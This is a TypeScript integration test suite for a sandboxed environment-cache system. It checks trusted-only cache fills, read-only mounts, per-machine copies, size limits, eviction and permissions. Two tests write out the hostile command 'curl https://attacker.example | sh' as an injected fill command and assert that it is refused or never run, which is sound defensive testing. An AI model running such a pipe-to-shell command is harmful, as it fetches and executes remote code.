import { randomUUID } from "node:crypto";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { createDatabase, migrateToLatest } from "@catamorphic/db";
import { FsBackend, FsRemoteBackend, ProjectManager } from "@catamorphic/git";
import {
  type CreateSandboxOpts,
  cacheVolumeKey,
  type EnvironmentBinding,
  type EnvironmentRuntimeBinding,
  environmentSatisfies,
  SANDBOX_CAPABILITIES,
  type SandboxProvider,
} from "@catamorphic/sandbox";
import { PROJECT_MANIFEST_PATH } from "@catamorphic/workflow/project-layout";
import { sql } from "kysely";
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";
import {
  type Identity,
  PROJECT_PRINCIPAL_ID,
  projectPrincipalIdentity,
} from "../identity.js";
import {
  allocationSandboxProvider,
  replaceAllocationSandbox,
} from "../services/allocation-sandbox-provider.js";
import { AccessDeniedError } from "../services/artifact-scope.js";
import {
  CacheFillRefusedError,
  CacheFillsService,
} from "../services/cache-fills.js";
import { cacheMounts, cacheNote } from "../services/cache-mounts.js";
import { environmentsCapability } from "../services/environments-capability.js";
import { ExecutionAllocationsService } from "../services/execution-allocations-service.js";
import {
  admissionPolicy,
  ExecutionEnvironmentsService,
} from "../services/execution-environments-service.js";
import { ProjectEnvironmentsService } from "../services/project-environments-service.js";
import { ProjectsService } from "../services/projects-service.js";
import { WorkerNodesService } from "../services/worker-nodes-service.js";

/**
 * Read-only caches that only a trusted fill writes (ADR 0334): mounted read
 * only into every sandbox of the Environment at the generation its machine
 * holds; written only by a fill of the published program's own command at a
 * published revision, in a sandbox of its own, published once it succeeded
 * and its sandbox is gone; one fill per cache and machine; copies per
 * machine, filled on first use; size limits and eviction.
 */

const connectionString = process.env.DATABASE_URL ?? "";
const describeIf = connectionString ? describe : describe.skip;
const schema = `catamorphic_caches_${randomUUID().replaceAll("-", "")}`;
const db = connectionString
  ? createDatabase({ connectionString, schema, poolSize: 4 })
  : undefined;

const tenantId = randomUUID();
const ada: Identity = { tenantId, externalUserId: "ada" };
const FILL = "pnpm fetch --store-dir ~/.pnpm-store";
const SETUP = "pnpm install --offline || pnpm install";

const capabilities = [
  SANDBOX_CAPABILITIES.images,
  SANDBOX_CAPABILITIES.egressPolicy,
  SANDBOX_CAPABILITIES.setupNetwork,
  SANDBOX_CAPABILITIES.caches,
];

const descriptor: EnvironmentBinding = {
  id: "review-machine",
  label: "Review machine",
  trust: "managed",
  isolation: "sandbox",
  workloads: ["agent"],
  agentTopologies: ["controller"],
  capabilities,
  resources: {},
};

/** A machine recording each sandbox, command and removal. */
function machine(name: string) {
  const created: Array<{ id: string; opts: CreateSandboxOpts }> = [];
  const commands: Array<{
    sandboxId: string;
    command: string;
    env?: Record<string, string>;
  }> = [];
  const destroyed: string[] = [];
  const behavior = {
    fillExit: 0,
    sizeKib: 2048,
    /** Runs while the fill command runs, before it answers. */
    duringFill: async () => {},
    /** Runs as a sandbox is removed. */
    onDestroy: async (_id: string) => {},
  };
  let sequence = 0;
  const provider: SandboxProvider = {
    workspaceRoot: "/workspace",
    capabilities,
    createSandbox: async (opts) => {
      sequence += 1;
      const id = `${name}-sandbox-${sequence}`;
      created.push({ id, opts });
      return {
        id,
        providerId: id,
        sandboxType: "execution",
        status: "started",
      };
    },
    destroySandbox: async (id) => {
      await behavior.onDestroy(id);
      destroyed.push(id);
    },
    startSandbox: async () => {},
    stopSandbox: async () => {},
    getSandboxStatus: async () => "started",
    executeCommand: async (sandboxId, command, opts) => {
      commands.push({
        sandboxId,
        command,
        ...(opts?.env ? { env: opts.env } : {}),
      });
      if (command === FILL) {
        await behavior.duringFill();
        return { exitCode: behavior.fillExit, result: "fetched\n" };
      }
      if (command.includes("du -sk"))
        return { exitCode: 0, result: `${behavior.sizeKib}\n` };
      return { exitCode: 0, result: "" };
    },
    uploadFiles: async () => {},
    downloadFile: async () => "",
    gitClone: async () => {},
    gitCheckout: async () => {},
  };
  return { provider, created, commands, destroyed, behavior };
}

describeIf("Environment caches (ADR 0334)", () => {
  let tmpDir: string;
  let projectId: string;
  let projectManager: ProjectManager;
  let published: string;
  let nodes: WorkerNodesService;
  const machines = new Map<
    string,
    { lease: { id: string; token: string }; fake: ReturnType<typeof machine> }
  >();
  let fills: CacheFillsService;
  let environments: ExecutionEnvironmentsService;
  const allocations = () => new ExecutionAllocationsService(db!);

  const manifest = (fillCommand: string) =>
    JSON.stringify({
      environments: {
        review: {
          workloads: ["agent"],
          image: "node:22",
          network: { egress: "allowlist", allow: ["api.example.com"] },
          setup: {
            command: SETUP,
            network: { allow: ["registry.npmjs.org"] },
          },
          caches: {
            pnpm: {
              path: "~/.pnpm-store",
              sizeMb: 4,
              fill: { command: fillCommand },
            },
          },
        },
      },
      defaultEnvironment: "review",
    });

  const addMachine = async (name: string) => {
    const lease = await nodes.register({
      tenantId,
      authorityId: `caches-${name}`,
      descriptor: { ...descriptor, id: `${descriptor.id}-${name}` },
    });
    const fake = machine(name);
    machines.set(lease.id, { lease, fake });
    return { lease, fake };
  };

  beforeAll(async () => {
    if (!db) throw new Error("unreachable");
    await migrateToLatest({ db, schema });
    tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), "catamorphic-caches-"));
    await fs.mkdir(path.join(tmpDir, "dev"));
    await fs.mkdir(path.join(tmpDir, "origin"));
    projectManager = new ProjectManager(
      new FsBackend(path.join(tmpDir, "dev")),
      new FsRemoteBackend(path.join(tmpDir, "origin")),
    );
    const projects = new ProjectsService(db, projectManager, [], {
      seedFiles: {},
    });
    projectId = (await projects.create(ada, { name: "Caches" })).id;
    const done = await projectManager.publishFiles({
      tenantId,
      projectId,
      files: { [PROJECT_MANIFEST_PATH]: manifest(FILL) },
      message: "Caches",
      author: { name: "Test", email: "test@example.com" },
    });
    if (done.status !== "deployed") throw new Error("not published");
    published = done.commitSha;
    await db
      .insertInto("published_revisions")
      .values({
        tenant_id: tenantId,
        project_id: projectId,
        commit_sha: published,
        status: "applied",
      })
      .execute();
    nodes = new WorkerNodesService(db);
    const projectEnvironments = new ProjectEnvironmentsService(
      db,
      projectManager,
    );
    environments = new ExecutionEnvironmentsService(projectEnvironments, {
      get: ({ requirements, workerNodeId }) => {
        const entries = [...machines.values()];
        const chosen = workerNodeId
          ? machines.get(workerNodeId)
          : entries.find(
              (entry) =>
                !requirements ||
                environmentSatisfies(
                  { ...descriptor, id: entry.lease.id },
                  requirements,
                ).compatible,
            );
        if (!chosen) return undefined;
        const binding: EnvironmentRuntimeBinding = {
          descriptor: {
            ...descriptor,
            id: `${descriptor.id}-${chosen.lease.id}`,
          },
          workerNodeId: chosen.lease.id,
          workerLeaseToken: chosen.lease.token,
          sandboxProvider: chosen.fake.provider,
        };
        return binding;
      },
    });
    fills = new CacheFillsService({
      db,
      projectManager,
      projectEnvironments,
      executionEnvironments: environments,
      executionAllocations: allocations(),
      retentionDays: 30,
    });
  }, 120_000);

  beforeEach(async () => {
    await db!.deleteFrom("environment_cache_fills").execute();
    await db!.deleteFrom("environment_cache_requests").execute();
    for (const { fake } of machines.values()) {
      fake.created.length = 0;
      fake.commands.length = 0;
      fake.destroyed.length = 0;
      fake.behavior.fillExit = 0;
      fake.behavior.sizeKib = 2048;
      fake.behavior.duringFill = async () => {};
      fake.behavior.onDestroy = async () => {};
    }
  });

  afterAll(async () => {
    if (db) {
      await sql`drop schema if exists ${sql.id(schema)} cascade`.execute(db);
      await db.destroy();
    }
    if (tmpDir) await fs.rm(tmpDir, { recursive: true, force: true });
  });

  /** A review chat's workspace on a machine: its Allocation and sandbox. */
  const workspace = async (node: string) => {
    const admission = await environments.admit({
      identity: projectPrincipalIdentity({
        tenantId,
        projectId,
        environment: "review",
      }),
      projectId,
      owner: null,
      environment: "review",
      workerNodeId: node,
      requirements: { workload: "agent", topology: "controller" },
    });
    const entry = machines.get(node);
    if (!entry) throw new Error("no machine");
    const allocation = await allocations().create({
      identity: ada,
      projectId,
      environmentName: "review",
      workloadKind: "agent",
      rootWorkloadId: randomUUID(),
      workerNodeId: node,
      policy: admissionPolicy({ admission, connections: [] }),
    });
    const provider = allocationSandboxProvider({
      db: db!,
      allocation,
      provider: entry.fake.provider,
      workerLeaseToken: entry.lease.token,
    });
    const handle = await provider.createSandbox({});
    return {
      allocation,
      sandboxId: handle.providerId,
      opts: entry.fake.created.at(-1)?.opts,
    };
  };

  const fillRows = () =>
    db!
      .selectFrom("environment_cache_fills")
      .selectAll()
      .orderBy("created_at")
      .execute();

  const key = (generation: number) =>
    cacheVolumeKey({
      projectId,
      environment: "review",
      name: "pnpm",
      generation,
    });

  /** Run every due fill to its end. */
  const fillAll = async () => {
    await fills.dispatch();
    await fills.drain();
  };

  it("fills a machine on first use, then mounts its copy read only into agent and setup sandboxes", async () => {
    const { lease, fake } = await addMachine("a");
    // The machine has no copy: nothing is mounted, and a fill is queued.
    const first = await workspace(lease.id);
    expect(first.opts?.volumes ?? []).toEqual([]);
    expect(
      await cacheNote({ db: db!, allocation: first.allocation }),
    ).toContain("has no copy yet");
    const queued = await fillRows();
    expect(queued).toMatchObject([
      {
        worker_node_id: lease.id,
        status: "queued",
        reason: "first-use",
        cache_name: "pnpm",
      },
    ]);
    // A second workspace there meanwhile joins it rather than queueing more.
    await workspace(lease.id);
    expect(await fillRows()).toHaveLength(1);

    fake.created.length = 0;
    await fillAll();
    const [filled] = await fillRows();
    expect(filled).toMatchObject({
      status: "succeeded",
      commit_sha: published,
      size_bytes: String(2048 * 1024),
    });
    const generation = Number(filled?.generation);

    // The fill's own sandbox: the cache writable at its new generation and
    // nothing else, on the setup's network as its own, the published
    // program's command, no secrets, and removed before publishing.
    expect(fake.created).toHaveLength(1);
    const fillSandbox = fake.created[0];
    expect(fillSandbox?.opts.volumes).toEqual([
      { key: key(generation), path: "~/.pnpm-store" },
    ]);
    expect(fillSandbox?.opts.egress).toEqual({
      mode: "allowlist",
      allow: ["registry.npmjs.org"],
    });
    expect(fillSandbox?.opts.image).toEqual({
      kind: "oci",
      reference: "node:22",
    });
    const ran = fake.commands.filter(
      (command) => command.sandboxId === fillSandbox?.id,
    );
    expect(ran.find((command) => command.command === FILL)?.env).toEqual({});
    expect(
      ran.some((command) => command.command.includes(".work-cache.json")),
    ).toBe(true);
    expect(fake.destroyed).toContain(fillSandbox?.id);

    // Agent sandboxes mount it read only.
    const agent = await workspace(lease.id);
    expect(agent.opts?.volumes).toEqual([
      { key: key(generation), path: "~/.pnpm-store", readOnly: true },
    ]);
    expect(
      await cacheNote({ db: db!, allocation: agent.allocation }),
    ).toContain(`filled from main at ${published.slice(0, 12)}`);
    // So does the sandbox a setup on its own network replaces it with.
    await replaceAllocationSandbox({
      db: db!,
      allocation: agent.allocation,
      provider: fake.provider,
      sandboxId: agent.sandboxId,
      workerLeaseToken: lease.token,
    });
    await allocationSandboxProvider({
      db: db!,
      allocation: agent.allocation,
      provider: fake.provider,
      workerLeaseToken: lease.token,
    }).createSandbox({});
    expect(fake.created.at(-1)?.opts.volumes).toEqual([
      { key: key(generation), path: "~/.pnpm-store", readOnly: true },
    ]);
  });

  it("publishes a fill only once it succeeded and its sandbox is gone; a failed one leaves the old cache", async () => {
    const { lease, fake } = await addMachine("b");
    await workspace(lease.id);
    await fillAll();
    const old = Number((await fillRows())[0]?.generation);

    // While the next fill runs, and until its sandbox is gone, new
    // sandboxes still mount the old generation.
    const seen: unknown[] = [];
    const mounted = async () => {
      const { opts } = await workspace(lease.id);
      seen.push(opts?.volumes?.[0]?.key);
    };
    fake.behavior.duringFill = mounted;
    fake.behavior.onDestroy = mounted;
    await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "deploy-1",
    });
    await fillAll();
    const next = (await fillRows()).at(-1);
    expect(next?.status).toBe("succeeded");
    expect(seen).toEqual([key(old), key(old)]);
    fake.behavior.duringFill = async () => {};
    fake.behavior.onDestroy = async () => {};
    expect((await workspace(lease.id)).opts?.volumes?.[0]?.key).toBe(
      key(Number(next?.generation)),
    );

    // A failed fill and one past its size leave the cache as it was.
    const current = Number(next?.generation);
    fake.behavior.fillExit = 1;
    await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "deploy-2",
    });
    await fillAll();
    expect((await fillRows()).at(-1)).toMatchObject({
      status: "failed",
      error: expect.stringContaining("The fill command exited 1"),
    });
    fake.behavior.fillExit = 0;
    fake.behavior.sizeKib = 5 * 1024;
    await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "deploy-3",
    });
    await fillAll();
    expect((await fillRows()).at(-1)).toMatchObject({
      status: "failed",
      error: expect.stringContaining("its limit is 4 MiB"),
    });
    expect((await workspace(lease.id)).opts?.volumes?.[0]?.key).toBe(
      key(current),
    );
  });

  it("runs one fill per cache and machine at a time", async () => {
    const { lease, fake } = await addMachine("c");
    await workspace(lease.id);
    await fillAll();
    // Requests while one waits join it; their keys answer the same fill.
    const first = await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "a",
    });
    const second = await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "b",
    });
    expect(second.fills.map((fill) => fill.id)).toEqual(
      first.fills.map((fill) => fill.id),
    );
    // While it runs, a new request waits behind it and no pass starts it.
    let release: () => void = () => {};
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    const passes: number[] = [];
    fake.behavior.duringFill = async () => {
      await fills.request({
        identity: ada,
        projectId,
        environment: "review",
        cache: "pnpm",
        idempotencyKey: "c",
      });
      passes.push(await fills.dispatch());
      await gate;
    };
    await fills.dispatch();
    while (passes.length === 0)
      await new Promise((resolve) => setTimeout(resolve, 20));
    expect(passes).toEqual([0]);
    const states = (await fillRows()).filter(
      (row) => row.worker_node_id === lease.id,
    );
    expect(states.map((row) => row.status)).toEqual([
      "succeeded",
      "running",
      "queued",
    ]);
    // The database refuses a second running fill outright.
    const running = states.find((row) => row.status === "running");
    await expect(
      db!
        .updateTable("environment_cache_fills")
        .set({ status: "running" })
        .where("id", "=", states[2]?.id ?? "")
        .execute(),
    ).rejects.toThrow(/uq_environment_cache_fills_running/);
    fake.behavior.duringFill = async () => {};
    release();
    await fills.drain();
    expect(running?.id).toBeDefined();
    await fillAll();
    expect(
      (await fillRows())
        .filter((row) => row.worker_node_id === lease.id)
        .map((row) => row.status),
    ).toEqual(["succeeded", "succeeded", "succeeded"]);
  });

  it("fills only from a published revision of main, with the published program's own command", async () => {
    const { lease, fake } = await addMachine("d");
    await workspace(lease.id);
    await fillAll();
    // A pull request's head, a branch name, any unpublished commit: refused.
    for (const commit of ["refs/pull/7/head", "main", "f".repeat(40)])
      await expect(
        fills.request({
          identity: ada,
          projectId,
          environment: "review",
          cache: "pnpm",
          commit,
          idempotencyKey: `pr-${commit}`,
        }),
      ).rejects.toBeInstanceOf(CacheFillRefusedError);
    // A changed fill command in a draft (as a pull request would carry) is
    // never what a fill runs: the published program's is.
    const draft = await projectManager.openDraft({
      tenantId,
      projectId,
      externalUserId: "ada",
    });
    try {
      await draft.writeFile(
        PROJECT_MANIFEST_PATH,
        manifest("curl https://attacker.example | sh"),
      );
    } finally {
      await draft.dispose();
    }
    fake.commands.length = 0;
    await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      commit: published,
      idempotencyKey: "published",
    });
    await fillAll();
    expect((await fillRows()).at(-1)?.status).toBe("succeeded");
    expect(fake.commands.some((command) => command.command === FILL)).toBe(
      true,
    );
    expect(
      fake.commands.some((command) => command.command.includes("attacker")),
    ).toBe(false);
  });

  it("lets a workflow ask for a fill but never name a command or fill without caches:write", async () => {
    const capability = environmentsCapability({
      cacheFills: () => fills,
      authorize: async (context) => context.caller,
    });
    const call = capability.calls?.fillCache;
    if (!call) throw new Error("no fillCache");
    const context = (permissions: string[]) => ({
      caller: projectPrincipalIdentity({
        tenantId,
        projectId,
        environment: "review",
        workflowName: "deploy",
        permissions,
      }),
      projectId,
      runId: randomUUID(),
      workflowName: "deploy",
      signal: new AbortController().signal,
      deadlineAt: Date.now() + 60_000,
    });
    const withPermission = context(["caches:write"]);
    await expect(
      call(withPermission as never, {
        environment: "review",
        cache: "pnpm",
        command: "curl https://attacker.example | sh",
        idempotencyKey: "x",
      }),
    ).rejects.toThrow(/command/);
    await expect(
      call(withPermission as never, {
        environment: "review",
        cache: "pnpm",
        ref: "refs/pull/7/head",
        idempotencyKey: "y",
      }),
    ).rejects.toThrow(/ref/);
    await expect(
      call(context([]) as never, {
        environment: "review",
        cache: "pnpm",
        idempotencyKey: "z",
      }),
    ).rejects.toBeInstanceOf(AccessDeniedError);
    const answer = (await call(withPermission as never, {
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "ok",
    })) as { fills: Array<{ status: string; commit: string | null }> };
    expect(answer.fills.length).toBeGreaterThan(0);
    expect(answer.fills.every((fill) => fill.commit === null)).toBe(true);
  });

  it("keeps copies per machine: a new machine fills its own on first use", async () => {
    const a = await addMachine("e");
    await workspace(a.lease.id);
    await fillAll();
    const b = await addMachine("f");
    // A request fills the machines holding a copy, not a new one.
    const requested = await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "fan-out",
    });
    expect(requested.fills.map((fill) => fill.machine)).not.toContain(
      b.lease.id,
    );
    const fresh = await workspace(b.lease.id);
    expect(fresh.opts?.volumes ?? []).toEqual([]);
    await fillAll();
    const own = (await fillRows()).find(
      (row) => row.worker_node_id === b.lease.id && row.status === "succeeded",
    );
    expect(own).toBeDefined();
    expect(b.fake.created.some((entry) => entry.opts.volumes?.length)).toBe(
      true,
    );
    expect((await workspace(b.lease.id)).opts?.volumes).toEqual([
      {
        key: key(Number(own?.generation)),
        path: "~/.pnpm-store",
        readOnly: true,
      },
    ]);
    const listed = await fills.list({ identity: ada, projectId });
    expect(listed).toHaveLength(1);
    expect(listed[0]?.copies.map((copy) => copy.machine)).toEqual(
      expect.arrayContaining([a.lease.id, b.lease.id]),
    );
  });

  it("evicts a copy nobody mounted for the retention period", async () => {
    const { lease } = await addMachine("g");
    await workspace(lease.id);
    await fillAll();
    expect((await workspace(lease.id)).opts?.volumes).toHaveLength(1);
    await db!
      .updateTable("environment_cache_fills")
      .set({ last_used_at: sql<Date>`now() - interval '31 days'` })
      .where("worker_node_id", "=", lease.id)
      .execute();
    await fills.dispatch();
    expect(
      (await fillRows()).find((row) => row.worker_node_id === lease.id)?.status,
    ).toBe("evicted");
    // Never mounted again; the next workspace queues a fill.
    const after = await workspace(lease.id);
    expect(after.opts?.volumes ?? []).toEqual([]);
    expect(
      (await fillRows()).filter(
        (row) => row.worker_node_id === lease.id && row.status === "queued",
      ),
    ).toHaveLength(1);
    await fills.drain();
  });

  it("gives the project's caches to every owner's sandboxes, and none to a fill but its own", async () => {
    const { lease } = await addMachine("h");
    const { allocation } = await workspace(lease.id);
    expect(allocation.policy.sandbox?.caches).toEqual([
      { name: "pnpm", path: "~/.pnpm-store" },
    ]);
    expect(
      await cacheMounts({
        db: db!,
        allocation: {
          ...allocation,
          policy: {
            ...allocation.policy,
            sandbox: {
              ...allocation.policy.sandbox,
              fill: { name: "pnpm", path: "~/.pnpm-store", key: key(99) },
            },
          },
        },
      }),
    ).toEqual([{ key: key(99), path: "~/.pnpm-store" }]);
    expect(PROJECT_PRINCIPAL_ID).toBeTruthy();
    await fills.drain();
  });
});
